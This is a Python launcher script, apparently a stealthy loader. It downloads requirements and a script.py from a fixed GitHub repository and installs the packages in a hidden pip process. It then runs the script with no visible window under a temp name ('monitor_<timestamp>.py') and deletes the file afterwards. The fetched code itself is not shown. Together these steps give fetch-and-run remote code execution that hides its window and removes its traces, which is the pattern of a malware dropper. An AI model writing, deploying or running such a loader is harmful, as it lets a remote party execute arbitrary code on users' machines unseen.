# github_launcher.pyw - Downloads and runs script.py from temp, installs requirements
import os
import sys
import subprocess
import urllib.request
import tempfile
import time
import traceback
import atexit
import threading

def install_requirements():
    """Download and install requirements from requirements.txt in GitHub repository"""
    try:
        # URL to requirements.txt on GitHub
        requirements_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/requirements.txt"
        
        print("Checking for requirements.txt...")
        
        # Download the requirements.txt
        response = urllib.request.urlopen(requirements_url, timeout=10)
        requirements_content = response.read().decode('utf-8').strip()
        
        if not requirements_content:
            print("requirements.txt is empty, skipping installation")
            return True
        
        # Save requirements to temp file
        temp_dir = tempfile.gettempdir()
        temp_req = os.path.join(temp_dir, f"requirements_{int(time.time())}.txt")
        
        with open(temp_req, 'w', encoding='utf-8') as f:
            f.write(requirements_content)
        
        print(f"Requirements saved to: {temp_req}")
        print(f"Installing packages from requirements.txt...")
        
        # Run pip install in background thread to avoid blocking
        def run_pip_install():
            try:
                # Try to upgrade pip first
                subprocess.check_call([
                    sys.executable, "-m", "pip", "install", "--upgrade", "pip"
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            
            # Install requirements
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            process = subprocess.Popen(
                [sys.executable, "-m", "pip", "install", "-r", temp_req, "--user"],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for installation to complete with timeout
            for _ in range(60):  # 60 seconds timeout
                if process.poll() is not None:
                    break
                time.sleep(1)
            
            # Clean up temp requirements file
            try:
                os.remove(temp_req)
            except:
                pass
            
            if process.returncode == 0:
                print("✓ Requirements installed successfully")
            else:
                print(f"⚠ Requirements installation completed with code: {process.returncode}")
        
        # Start installation in background thread
        install_thread = threading.Thread(target=run_pip_install, daemon=True)
        install_thread.start()
        
        return True
        
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print("requirements.txt not found in repository, skipping installation")
            return True
        else:
            print(f"Error downloading requirements.txt: {e}")
            return False
    except Exception as e:
        print(f"Error during requirements installation: {e}")
        traceback.print_exc()
        return False

def delete_temp_file(temp_script_path):
    """Try to delete the temp file with retries"""
    if not temp_script_path or not os.path.exists(temp_script_path):
        return
    
    # Try multiple times to delete the file
    for attempt in range(10):
        try:
            time.sleep(1)
            os.remove(temp_script_path)
            print(f"✓ Temp file deleted on attempt {attempt + 1}")
            return True
        except (PermissionError, OSError) as e:
            if attempt < 9:
                print(f"Attempt {attempt + 1} failed, retrying...")
                continue
            else:
                print(f"✗ Failed to delete temp file after 10 attempts")
                return False
        except Exception as e:
            print(f"Error deleting file: {e}")
            return False

def run_script_from_github():
    """Download script.py from GitHub, run it, then delete temp file"""
    temp_script = None
    try:
        # URL to script.py on GitHub
        script_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
        
        print("Downloading script from GitHub...")
        
        # Download the script
        response = urllib.request.urlopen(script_url, timeout=10)
        script_code = response.read().decode('utf-8')
        
        # Save to temp file with random name
        temp_dir = tempfile.gettempdir()
        timestamp = str(int(time.time()))
        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
        
        # Write script to temp file
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        print(f"✓ Script saved to: {temp_script}")
        
        # Register cleanup function
        atexit.register(delete_temp_file, temp_script)
        
        # Run it hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print(f"✓ Script started with PID: {process.pid}")
        
        # Try to delete the temp file after a delay (in background)
        def delayed_delete():
            time.sleep(10)
            delete_temp_file(temp_script)
        
        delete_thread = threading.Thread(target=delayed_delete, daemon=True)
        delete_thread.start()
        
        return True
        
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print("✗ script.py not found in repository")
            return False
        else:
            print(f"✗ Error downloading script: {e}")
            return False
    except Exception as e:
        print(f"✗ Error: {e}")
        traceback.print_exc()
        # Clean up temp file if we created it but failed to run
        if temp_script and os.path.exists(temp_script):
            try:
                os.remove(temp_script)
            except:
                pass
        return False

def main():
    """Main launcher function"""
    print("=" * 60)
    print("GitHub Auto-Deploy Launcher")
    print("=" * 60)
    
    # Step 1: Install requirements
    print("\n[1/2] Installing requirements...")
    install_requirements()
    
    # Step 2: Wait a moment for installations to start
    print("\n[2/2] Starting main script...")
    time.sleep(2)  # Give pip a moment
    
    # Run the script
    success = run_script_from_github()
    
    if success:
        print("\n" + "=" * 60)
        print("✓ Launcher completed successfully")
        print("=" * 60)
    else:
        print("\n" + "=" * 60)
        print("✗ Launcher encountered errors")
        print("=" * 60)
    
    # Keep launcher alive for a bit
    time.sleep(5)
    
    # Exit
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
